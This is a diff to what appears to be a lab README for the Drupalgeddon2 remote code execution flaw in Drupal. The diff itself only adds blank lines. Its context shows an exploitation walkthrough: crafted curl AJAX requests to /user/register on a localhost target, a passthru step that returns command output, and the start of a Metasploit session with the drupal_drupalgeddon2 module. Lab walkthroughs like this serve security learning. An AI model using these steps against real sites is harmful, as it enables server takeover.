@@ -44,6 +44,7 @@ The vulnerability stems from Drupal's internal **Form API render arrays**. Drupa
 ## Exploitation Walkthrough
 
 ### 1. Verification of Vulnerability via Curl
+
 You can trigger the vulnerability by sending a crafted AJAX form submission to `/user/register`:
 
 ```bash
@@ -53,6 +54,7 @@ curl -k -i -X POST 'http://localhost:8120/user/register?element_parents=account/
 ```
 
 ### 2. Spawning a Command Output Stream
+
 To view command output cleanly via `passthru`:
 
 ```bash
@@ -64,7 +66,9 @@ curl -k -s -X POST 'http://localhost:8120/user/register?element_parents=account/
 The server immediately executes the command and echoes the operating system information back in the AJAX JSON response envelope.
 
 ### 3. Automated Metasploit Exploitation
+
 You can also exploit this target using the official Metasploit module:
+
 ```bash
 msfconsole -q
 use exploit/unix/webapp/drupal_drupalgeddon2
